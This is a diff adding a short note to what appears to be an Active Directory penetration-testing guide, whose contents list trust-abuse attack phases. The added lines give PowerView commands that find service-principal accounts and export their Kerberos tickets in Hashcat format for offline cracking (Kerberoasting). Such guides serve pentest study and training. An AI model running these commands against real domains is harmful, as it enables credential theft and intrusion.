@@ -12,6 +12,11 @@
 - [Phase 7: Attacking AD Trusts - Child → Parent](#phase-7-attacking-ad-trusts-child--parent-trust)
 - [Phase 8: Attacking AD Trusts - Cross-Forest](#phase-8-attacking-ad-trusts-cross-forest-trust-abuse)
 
+**Note:**
+- On getting a foot hold, check 'systeminfo` for later payload crafting.
+- Finding SPN account (powerview): `Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName`
+- Targeting a SPN account (powerview): `Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\svc\_sql\_tgs.csv -NoTypeInformation`
+
 # Additional AD Auditing Techniques
 
 - [Active Directory Explorer](#Creating-an-AD-Snapshot-with-Active-Directory-Explorer)
